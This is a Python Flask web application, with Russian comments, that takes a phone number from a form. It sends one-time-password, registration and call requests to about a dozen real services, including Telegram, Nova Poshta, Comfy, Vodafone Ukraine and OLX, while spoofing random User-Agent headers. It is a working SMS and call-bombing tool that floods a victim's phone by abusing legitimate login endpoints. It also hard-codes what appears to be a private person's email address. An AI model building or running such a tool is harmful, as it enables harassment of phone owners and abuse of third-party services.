from flask import Flask, render_template, request
import requests
import fake_useragent

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        # Получаем номер без '+'
        Number = request.form.get('phone')
        
        # Проверка, чтобы номер начинался с цифры
        if not Number.isdigit():
            return "Номер должен содержать только цифры", 400
        
        # Добавляем "+" перед номером при отправке
        phone_number_with_plus = "+" + Number
        
        # Используем fake user-agent
        user = fake_useragent.UserAgent().random
        headers = {'User-Agent': user}

        try:
            response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': phone_number_with_plus})
            print("telegram")
        except Exception as e:
            return f"Ошибка при отправке на Telegram: {str(e)}", 500

        try:
            response = requests.post('https://id.novaposhta.ua/registration/v2/phone', headers=headers, json={'challenge': "6f8441e062b94f718c275d7c18d85e4d", 'language': "uk", 'otpsend': 'false', 'otptype': "sms", 'token': "YOUR_TOKEN", 'username': phone_number_with_plus})
            print("novaposhta")
        except Exception as e:
            return f"Ошибка при отправке на Novaposhta: {str(e)}", 500

        try:
            response = requests.post('https://comfy.ua/api/auth/v3/ivr/send', headers=headers, json={'phone': phone_number_with_plus})
            print("comfy звонок")
        except Exception as e:
            return f"Ошибка при отправке на Comfy: {str(e)}", 500

        try:
            response = requests.post('https://comfy.ua/api/auth/v3/otp/send', headers=headers, json={'phone': phone_number_with_plus})
            print("comfy")
        except Exception as e:
            return f"Ошибка при отправке на Comfy: {str(e)}", 500

        try:
            response = requests.post('https://bi.ua/api/v1/accounts', headers=headers, json={'g-recaptcha-token': "YOUR_RECAPTCHA_TOKEN", 'phone': phone_number_with_plus})
            print("bi")
        except Exception as e:
            return f"Ошибка при отправке на Bi: {str(e)}", 500

        try:
            response = requests.post('https://mw-api.vodafone.ua/otp/api/one-time-password/secured', headers=headers, json={'receiver': phone_number_with_plus, 'receiverTypeKey': "PHONE-NUMBER", 'typeKey': "MYVF-LOGIN-IOS"})
            print("vodafon")
        except Exception as e:
            return f"Ошибка при отправке на Vodafone: {str(e)}", 500

        try:
            response = requests.post('https://login.olx.ua/api/registration', headers=headers, json={'username': phone_number_with_plus})
            print("olx")
        except Exception as e:
            return f"Ошибка при отправке на OLX: {str(e)}", 500

        try:
            response = requests.post('https://ucb.z.apteka24.ua/api/send/otp', headers=headers, json={'phone': phone_number_with_plus})
            print("apteka24")
        except Exception as e:
            return f"Ошибка при отправке на Apteka24: {str(e)}", 500

        try:
            response = requests.post('https://my.ctrs.com.ua/api/v2/signup', headers=headers, json={'phone': phone_number_with_plus, 'email': "aminovdanirdamirovic@gmail.com"})
            print("crts")
        except Exception as e:
            return f"Ошибка при отправке на CRTS: {str(e)}", 500

        try:
            response = requests.post('https://esputnik.com/site-events/api/v1/webcontact', headers=headers, json={'phone': phone_number_with_plus})
            print("esputnik")
        except Exception as e:
            return f"Ошибка при отправке на Esputnik: {str(e)}", 500

        try:
            response = requests.post('https://kyiv.be.budusushi.ua/login', headers=headers, data={'LoginForm[username]': phone_number_with_plus})
            print("budusushi")
        except Exception as e:
            return f"Ошибка при отправке на Budusushi: {str(e)}", 500

        if response.status_code == 200:
            return f"СМС отправлено на {phone_number_with_plus}"
        else:
            return "Не удалось отправить СМС", 500

    return render_template('index.html')

if __name__ == "__main__":
    app.run(debug=True)
